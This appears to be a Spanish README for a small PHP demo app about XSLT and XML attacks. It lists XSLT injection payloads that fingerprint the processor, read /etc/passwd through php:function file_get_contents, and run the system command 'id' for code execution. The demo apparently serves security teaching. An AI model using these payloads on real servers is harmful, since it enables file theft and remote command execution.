# modulo-cursos


Aplicación simple en PHP para demostrar ataques de XSLT y XML


```

Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />

<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />


RCE <xsl:value-of select="php:function('system','id')" />



```